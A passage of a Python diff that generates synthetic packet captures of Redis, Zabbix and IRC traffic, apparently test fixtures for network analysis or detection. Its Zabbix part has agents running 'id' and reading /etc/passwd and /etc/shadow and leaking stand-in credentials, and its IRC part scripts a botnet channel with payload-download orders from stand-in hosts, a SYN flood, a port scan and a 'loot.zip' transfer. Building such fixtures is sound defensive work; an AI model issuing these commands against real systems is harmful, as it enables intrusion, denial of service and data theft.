+                    (True, _resp('SUBSCRIBE', 'news')), (False, b'>3\r\n$9\r\nsubscribe\r\n$4\r\nnews\r\n:1\r\n'),
+                    (False, b'>3\r\n$7\r\nmessage\r\n$4\r\nnews\r\n$5\r\nhello\r\n')]
+    return (tcp_segments(CLIENT, REDIS_SERVER, 43000, 6379, [(True, _resp('PING')), (False, noauth)])
+            + tcp_segments(CLIENT, REDIS_SERVER, 43001, 6379, [
+                (True, b'AUTH wrongpass\r\nINFO\r\n'),
+                (False, b'-WRONGPASS invalid username-password pair or user is disabled.\r\n' + noauth)])
+            + tcp_segments(CLIENT, REDIS_SERVER, 43002, 6379, session)
+            + tcp_segments(CLIENT, REDIS_OPEN, 43003, 6379, open_session))
+
+
+def write_redis_pcap(path):
+    write_pcap(path, redis_packets())
+
+
+# ---------------------------------------------------------------- Zabbix
+#
+# Shaped on a capture of Zabbix agent 7.0.22. CLIENT runs zabbix_get
+# against ZABBIX_AGENT (port 10050): agent.version, system.run[id] (run:
+# uid=0(root)...), system.run[cat /etc/passwd] (refused - Unsupported
+# item key) and a 7.0 JSON passive check of system.uname. ZABBIX_AGENT
+# asks ZABBIX_SERVER (10051) for its active checks twice - given
+# system.uptime, system.run[cat /etc/passwd | head -3] and
+# vfs.file.contents[/etc/shadow], and the first time a remote command
+# (id 1001: id; uname -a) - and sends its data: the passwd lines and the
+# command's output. ZABBIX_PROXY fetches its configuration, which carries
+# a host's IPMI password and TLS PSK and a secret macro. CLIENT asks the
+# server to run script 6 on host 10596, which fails.
+
+ZABBIX_SERVER = '198.51.100.103'
+ZABBIX_AGENT = '198.51.100.104'
+ZABBIX_PROXY = '198.51.100.105'
+
+
+def _zabbix(data):
+    data = data if isinstance(data, bytes) else json.dumps(data, separators=(',', ':')).encode()
+    return b'ZBXD\x01' + struct.pack('<II', len(data), 0) + data
+
+
+def zabbix_packets():
+    passive = [('agent.version', b'7.0.22'), ('system.run[id]', b'uid=0(root) gid=0(root) groups=0(root)'),
+               ('system.run[cat /etc/passwd]', b'ZBX_NOTSUPPORTED\x00Unsupported item key.')]
+    packets = []
+    port = 43100
+    for key, value in passive:
+        packets += tcp_segments(CLIENT, ZABBIX_AGENT, port, 10050, [(True, _zabbix(key.encode())), (False, _zabbix(value))])
+        port += 1
+    packets += tcp_segments(CLIENT, ZABBIX_AGENT, port, 10050, [
+        (True, _zabbix({'request': 'passive checks', 'data': [{'key': 'system.uname', 'timeout': 3}]})),
+        (False, _zabbix({'version': '7.0.22', 'variant': 1, 'data': [{'value': 'Linux web01 6.12.113 x86_64'}]}))])
+    items = [{'key': 'system.uptime', 'itemid': 1, 'delay': '5s', 'lastlogsize': 0, 'mtime': 0},
+             {'key': 'system.run[cat /etc/passwd | head -3]', 'itemid': 2, 'delay': '5s', 'lastlogsize': 0, 'mtime': 0},
+             {'key': 'vfs.file.contents[/etc/shadow]', 'itemid': 3, 'delay': '5s', 'lastlogsize': 0, 'mtime': 0}]
+    ask = {'request': 'active checks', 'host': 'web01', 'config_revision': 0, 'session': 'a1b2', 'version': '7.0.22',
+           'variant': 1}
+    passwd = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'
+    exchanges = [
+        (ask, {'response': 'success', 'config_revision': 3, 'data': items,
+               'commands': [{'command': 'id; uname -a', 'id': 1001, 'wait': 1}]}),
+        ({'request': 'agent data', 'session': 'a1b2', 'version': '7.0.22', 'variant': 1, 'host': 'web01',
+          'data': [{'itemid': 1, 'value': '1218215', 'id': 1, 'clock': 1794046455, 'ns': 1},
+                   {'itemid': 2, 'value': passwd, 'id': 2, 'clock': 1794046455, 'ns': 2}],
+          'commands': [{'id': 1001, 'value': 'uid=0(root) gid=0(root) groups=0(root)\nLinux web01 6.12.113'}]},
+         {'response': 'success', 'info': 'processed: 2; failed: 0; total: 2; seconds spent: 0.000100'}),
+        (dict(ask, config_revision=3), {'response': 'success', 'config_revision': 3, 'data': items}),
+        ({'request': 'agent data', 'session': 'a1b2', 'version': '7.0.22', 'variant': 1, 'host': 'web01',
+          'data': [{'itemid': 3, 'value': 'root:*:20753:0:99999:7:::', 'id': 3, 'clock': 1794046456, 'ns': 3}]},
+         {'response': 'success', 'info': 'processed: 1; failed: 0; total: 1; seconds spent: 0.000100'})]
+    port = 43200
+    for request, response in exchanges:
+        packets += tcp_segments(ZABBIX_AGENT, ZABBIX_SERVER, port, 10051, [(True, _zabbix(request)), (False, _zabbix(response))])
+        port += 1
+    config = {'data': {
+        'hosts': {'fields': ['hostid', 'host', 'status', 'ipmi_username', 'ipmi_password', 'tls_psk_identity', 'tls_psk'],
+                  'data': [[10620, 'db01', 0, 'admin', 'ipmiPass1', 'psk01', '1f87b6e3a0c2d4'],
+                           [10621, 'web01', 0, '', '', '', '']]},
+        'globalmacro': {'fields': ['globalmacroid', 'macro', 'value', 'type'],
+                        'data': [[2, '{$SNMP_COMMUNITY}', 'public', 0], [3, '{$DB.PASSWORD}', 'Sup3rS3cret', 1]]}},
+        'config_revision': 8}
+    packets += tcp_segments(ZABBIX_PROXY, ZABBIX_SERVER, 43300, 10051, [
+        (True, _zabbix({'request': 'proxy config', 'host': 'Proxy1', 'version': '7.0.17', 'session': 'c3d4',
+                        'config_revision': 0})), (False, _zabbix(config))])
+    packets += tcp_segments(CLIENT, ZABBIX_SERVER, 43301, 10051, [
+        (True, _zabbix({'request': 'command', 'scriptid': '6', 'sid': '3e9d', 'clientip': CLIENT, 'hostid': '10596'})),
+        (False, _zabbix({'response': 'failed', 'info': 'Zabbix agent interface is not defined for host [Testhost]'}))])
+    return packets
+
+
+def write_zabbix_pcap(path):
+    write_pcap(path, zabbix_packets())
+
+
+# ---------------------------------------------------------------- IRC
+#
+# Shaped on a capture of ngIRCd 27. IRC_SERVER (6667) asks for a server
+# password: CLIENT:43400 gives the wrong one and is closed. IRC_HERDER:43401
+# registers as herder, joins #ddos, keys it (s3cr3tkey), sets its topic to
+# a download order, orders a SYN flood and a scan, asks the bot's VERSION
+# and fails an OPER. CLIENT:43402, the bot, finds herder taken (433), takes
+# USA|83621, is refused a wrong key (475), joins with the right one - the
+# topic, the herder's orders and its own flood report - answers VERSION as
+# mIRC, offers loot.zip by DCC, identifies to NickServ (botpass) and quits.
+# CLIENT:43403 is another bot on IRC_ALT_SERVER's port 6669, whose welcome
+# arrives split across two segments: [DEU|W10]48213, told .update by a
+# private message.
+
+IRC_SERVER = '198.51.100.106'
+IRC_HERDER = '198.51.100.107'
+IRC_ALT_SERVER = '198.51.100.108'
+
+
+def _irc(*lines):
+    return b''.join(line.encode() + b'\r\n' for line in lines)
+
+
+def irc_packets():
+    host = 'irc.evilnet.example'
+    welcome = lambda nick: _irc(f':{host} 001 {nick} :Welcome to the Internet Relay Network {nick}',
+                                f':{host} 004 {nick} {host} ngircd-27 abBcCFiIoqrRswx abehiIklmMnoOPqQrRstvVz',
+                                f':{host} 005 {nick} RFC2812 IRCD=ngIRCd NETWORK=EvilNet CHANTYPES=#&+ :are supported')
+    bot = 'USA|83621'
+    topic = '!download http://198.51.100.66/bins/x86 /tmp/.x'
+    failed = [(True, _irc('PASS wrongpw', 'NICK lurker', 'USER lurker 0 * :Lurker')),
+              (False, _irc('ERROR :Closing connection: lurker[~lurker@10.1.0.10] (Access denied: Bad password?)'))]
+    herder = [(True, _irc('PASS ircPass1', 'NICK herder', 'USER herder 0 * :Bot Herder')), (False, welcome('herder')),
+              (True, _irc('JOIN #ddos')), (False, _irc(':herder!~herder@198.51.100.107 JOIN :#ddos')),
+              (True, _irc('MODE #ddos +k s3cr3tkey', f'TOPIC #ddos :{topic}')),
+              (False, _irc(f':herder!~herder@198.51.100.107 TOPIC #ddos :{topic}')),
+              (True, _irc('PRIVMSG #ddos :!ddos.syn 203.0.113.50 80 120')),
+              (False, _irc(f':{bot}!~x00x@10.1.0.10 PRIVMSG #ddos :[DDoS]: Flooding 203.0.113.50:80 for 120 seconds.')),
+              (True, _irc(f'PRIVMSG {bot} :\x01VERSION\x01')),
+              (False, _irc(f':{bot}!~x00x@10.1.0.10 NOTICE herder :\x01VERSION mIRC v6.17 Khaled Mardam-Bey\x01')),
+              (True, _irc('PRIVMSG #ddos :.scan 445 10.0.0.0/8')),
+              (False, _irc(f':{bot}!~x00x@10.1.0.10 PRIVMSG herder :\x01DCC SEND loot.zip 3325256770 5050 48213\x01')),
+              (True, _irc('OPER admin wrongoper')), (False, _irc(f':{host} 464 herder :Invalid password')),
+              (True, _irc('QUIT :done'))]
+    bot_side = [(True, _irc('PASS ircPass1', 'NICK herder')), (False, _irc(f':{host} 433 * herder :Nickname already in use')),
+                (True, _irc(f'NICK {bot}', 'USER x00x 0 * :x')), (False, welcome(bot)),
+                (True, _irc('JOIN #ddos wrongkey')),
+                (False, _irc(f':{host} 475 {bot} #ddos :Cannot join channel (+k) -- Wrong channel key')),
+                (True, _irc('JOIN #ddos s3cr3tkey')),
+                (False, _irc(f':{bot}!~x00x@10.1.0.10 JOIN :#ddos', f':{host} 332 {bot} #ddos :{topic}',
+                             f':{host} 353 {bot} = #ddos :{bot} @herder')),
+                (False, _irc(':herder!~herder@198.51.100.107 PRIVMSG #ddos :!ddos.syn 203.0.113.50 80 120')),
+                (True, _irc('PRIVMSG #ddos :[DDoS]: Flooding 203.0.113.50:80 for 120 seconds.')),
+                (False, _irc(f':herder!~herder@198.51.100.107 PRIVMSG {bot} :\x01VERSION\x01')),
+                (True, _irc('NOTICE herder :\x01VERSION mIRC v6.17 Khaled Mardam-Bey\x01')),
+                (False, _irc(':herder!~herder@198.51.100.107 PRIVMSG #ddos :.scan 445 10.0.0.0/8')),
+                (True, _irc('PRIVMSG herder :\x01DCC SEND loot.zip 3325256770 5050 48213\x01')),
+                (True, _irc('PRIVMSG NickServ :IDENTIFY botpass')), (True, _irc('QUIT :bye')),
+                (False, _irc(f'ERROR :Closing connection: {bot}[~x00x@10.1.0.10] ("bye")'))]
+    other = '[DEU|W10]48213'
+    alt_welcome = welcome(other).replace(host.encode(), b'irc.alt.example')
+    alt = [(True, _irc(f'NICK {other}', 'USER w10 0 * :w10')), (False, alt_welcome[:30]), (False, alt_welcome[30:]),
+           (False, _irc(f':boss!~boss@203.0.113.9 PRIVMSG {other} :.update http://203.0.113.9/w.exe'))]
+    return (tcp_segments(CLIENT, IRC_SERVER, 43400, 6667, failed) + tcp_segments(IRC_HERDER, IRC_SERVER, 43401, 6667, herder)
+            + tcp_segments(CLIENT, IRC_SERVER, 43402, 6667, bot_side)
+            + tcp_segments(CLIENT, IRC_ALT_SERVER, 43403, 6669, alt))
+
+
+def write_irc_pcap(path):
+    write_pcap(path, irc_packets())
